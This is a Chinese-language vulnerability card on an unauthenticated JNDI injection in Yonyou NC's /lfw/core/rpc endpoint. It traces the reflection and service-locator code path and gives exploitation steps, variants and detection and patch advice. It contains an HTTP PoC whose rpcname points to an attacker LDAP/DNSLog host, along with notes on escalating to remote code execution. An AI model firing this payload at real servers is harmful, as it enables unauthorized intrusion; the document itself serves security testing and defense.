---
id: web-java-component-yonyou-nc-lfw-rpc-reflection-service-locator-jndi
title: 用友 NC /lfw/core/rpc 未授权 JSON-RPC 反射调用：ServiceLocator 服务定位把 rpcname 带入 JNDI（ldap://）注入
type: scenario
domain: web
path: web/java/component
technique: yonyou-nc-lfw-rpc-service-locator-jndi
tags:
- java
- yonyou
- nc
- rpc
- reflection
- service-locator
- jndi
- ldap
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: NC 6.5 / NC Cloud（lfw 接口；原文 2024-03-01 通告，补丁编码 NCM_NC6.5_000_109902_20240301_GP_281362040）
verification:
  verified_by: verifier-V503
  verified_at: '2026-11-11T02:45:28+08:00'
  notes: 已对照原文与24/24图核对：LfwCoreController→getControlPlugin(/rpc→RpcControlPlugin)→RpcHelper.processJsonRequest(rpcdata)→call(rpcname/method/params0-9)→ServiceLocator→NCLocator.lookup→AbstractContext.lookup→this.jndi(jndiName) 与图2-11一致，DNSLog dns+ldap 记录见图11；affected_versions 按原文通告 NC 6.5/NC Cloud 保留。未在真实目标复现 JNDI 利用，未验证目标 JDK/依赖对远程 codebase 的限制。
url: /docs/web/java/component/web-java-component-yonyou-nc-lfw-rpc-reflection-service-locator-jndi/
draft: false
kb_aliases:
- 用友 NC lfw RPC
- /lfw/core/rpc
- RpcControlPlugin
- RpcHelper.processJsonRequest
- NCLocator lookup
- ServiceLocator JNDI
- rpcname ldap
---

## 一句话结论

用友 NC 的 `/lfw/core/rpc` 由 `RpcControlPlugin` 把请求参数 `rpcdata` 解析成 JSON，取其中的 `rpcname`、`method` 与 `params0..9`，用 `ServiceLocator.getService(rpcname)` 取实例后 `getMethod(...).invoke(...)` 反射调用；当 `rpcname` 传入 `ldap://...` 时，服务定位器 `NCLocator` 的 `lookup` 会走到 `AbstractContext.lookup` 的 JNDI 分支 `this.jndi(jndiName)`，从而在无需登录的情况下形成 JNDI 注入（可结合 LDAP 远程类加载/反序列化利用）。

## 原理

- **入口路由**：`LfwCoreController.handleRequest` 取 `path = req.getPathInfo()`，通过 `PresentPluginFactory.getControlPlugin(path)` 选择插件；`path.equals("/rpc")` 时返回 `RpcControlPlugin`，其 `handle` 调用 `RpcHelper.processJsonRequest`，直接把结果写回响应。
- **参数全部可控**：`processJsonRequest` 读取 `request.getParameter("rpcdata")`，`new JSONObject(data)` 后用 `call(jsonReq)` 处理。`call` 依次取 `rpcname`（className）、`method`（methodName），并循环读取 `params0` 到 `params9`（最多 10 个参数），把每个值经 `LfwJsonSerializer.fromJsObject` 转换后放入 `paramObjs`；若参数以 `$S_` 开头会去掉前缀，随后统一做 `JsURLDecoder.decode(value, "UTF-8")`。
- **反射调用**：`instance = ServiceLocator.getService(className)`；`paramTypes` 取各参数运行时类；`instance.getClass().getMethod(methodName, paramTypes)` 后 `method.invoke(instance, paramObjs)`。没有类名/方法名白名单，也没有鉴权。
- **服务定位器如何走到 JNDI**：`ServiceLocator.getService(name)` → `getInstance().doGetService(name)`；`LocalServiceLocatorUap.doGetService` 调用 `NCLocator.getInstance().lookup(name)`。`AbstractContext.lookup(name)` 有三种分支：
  1. `name` 以 `->` 开头：截掉前缀后 `findMeta(name)`/`findComponent(meta)`，按组件元数据实例化（注册服务走这里）；
  2. 否则先 `this.getServiceCache().get(name)`，命中缓存直接返回；
  3. 若未命中且 `name` 以 `java:comp/env/` 开头则 `jndiCtx.lookup`；最终 `retObject` 仍为空时调用 `this.jndi(jndiName)`。
  因此任意未注册的名字（包括 `ldap://attacker/...`）都会落到 `this.jndi(jndiName)`，由 JNDI 发起外部 LDAP/RMI 请求。
- **为什么能利用**：JNDI 的 LDAP/RMI provider 会按 URL 连接攻击者服务器；在存在远程 codebase 加载或反序列化 gadget 的 JDK/依赖环境下可进一步 RCE；即使不能加载远程类，也能通过 DNS/LDAP 外带确认漏洞（原文用 DNSLog 看到 `dns` 与 `ldap` 两类记录）。
- **注意**：`rpcname` 填普通类名（如 `bsh.Interpreter`）不会被缓存/元数据命中，服务定位最终仍尝试 JNDI 并以异常/500 结束，因此“随便传类名直接调方法”并不可行；能反射调用任意方法的前提是名字对应已注册的服务（见文件上传卡），而 JNDI 分支则对任意 URL 字符串开放。

## 触发条件

- 目标为用友 NC / NC Cloud，`/lfw/core/rpc` 接口可从攻击者网络访问（无需登录）。
- 目标 JVM 的 JNDI/LDAP 客户端可出网到攻击者控制的 LDAP/RMI/DNS 服务；或使用 DNSLog 仅验证解析。
- 利用远程类加载/RCE 还需目标 JDK/依赖允许（高版本 JDK 默认禁止 `trustURLCodebase`，需配合本地 gadget 或反序列化链）。
- 仅限授权测试与防御验证。

## 利用步骤

1. 确认 `/lfw/core/rpc` 可达，向 `rpcdata` 传一个最小 JSON，观察响应是否为 JSON/`null` 或 500。
2. 构造 `rpcdata={"rpcname":"ldap://<your-ldap-or-dnslog>","method":"x","params0":"x"}`，以表单（`application/x-www-form-urlencoded`）POST 到 `/lfw/core/rpc`。
3. 观察 DNSLog/自建 LDAP 服务是否收到 DNS/LDAP 请求（`ldap` 记录表明 `this.jndi(name)` 已执行）。
4. 若目标允许远程 codebase，则在 LDAP 响应中返回恶意 Reference/序列化数据完成 RCE；否则改用 JNDI 反序列化 gadget 或仅将本路径作为信息外带/探测。
5. 需要调用已注册服务方法时，把 `rpcname` 换成对应接口名（见文件上传卡），`method`/`params` 按目标方法签名构造。

## PoC

```http
POST /lfw/core/rpc HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: <len>

rpcdata={"rpcname":"ldap://<attacker-ldap-or-dnslog>/x","method":"x","params0":"x"}
```

DNSLog 侧预期：先出现 `dns` 查询，随后出现 `ldap` 记录（原文截图即 `dns` 与 `ldap` 两类记录）。

说明：原文未提供完整的 LDAP 利用服务端代码；上述为最小验证请求，未在未授权目标上执行。

## 变体与关联

- **反射调用已注册服务**：`rpcname` 使用服务接口名（如 `nc.uap.portal.service.itf.IPortalSpecService`）可命中 `findMeta`/`findComponent`，进而反射调用实现类方法；用于任意文件上传/文件读取的具体链见 [[web-java-component-yonyou-nc-portalspec-createskinfile-upload]]。
- **JNDI 协议变体**：除 `ldap://` 外可尝试 `rmi://`、`iiop://` 等，受目标 JNDI provider 与 JDK 限制。
- **同类用友反射入口**：NCCloud GatewayServlet 的 `IActionInvokeService.exec` 反射桥（需 gatewaytoken）见 [[web-java-component-yonyou-nccloud-gateway-reflection-command-injection]]；本卡的 `/lfw/core/rpc` 无需 token，且多了 ServiceLocator→JNDI 的落点。
- **通用 JNDI 技巧**：高版本 JDK 绕过与本地 gadget 见 [[web-java-deser-hessian-spring-proxy-invocationhandler-jndi]] 及 `web/java/deserialization/jndi` 下的相关卡。

## 检测与防御

- **流量检测**：监控 `/lfw/core/rpc` 的请求体 `rpcdata` 中出现 `ldap://`、`rmi://`、`iiop://`、`java:comp/env/`、`->` 等特征；对 `rpcname` 为 URL 的请求直接拦截。
- **主机/网络**：NC 服务进程向外部 LDAP/RMI 端口发起连接或异常 DNS 查询；JNDI 相关类加载/反序列化告警；限制服务器出站到非业务地址。
- **防御**：应用官方补丁（原文补丁编码 `NCM_NC6.5_000_109902_20240301_GP_281362040` 对应 lfw 接口问题）；若业务不需要，禁用/限制 `/lfw/*` 接口对外访问；升级 JDK 并保持 `com.sun.jndi.ldap.object.trustURLCodebase=false`、`trustSerialData` 默认关闭；在服务定位器中为允许的 `rpcname`/方法建立白名单，拒绝 URL 形式的名字。
- **注意**：NC 系统版本/补丁差异较大，需以实际版本验证接口是否存在；JNDI 利用受目标 JDK 与依赖限制。
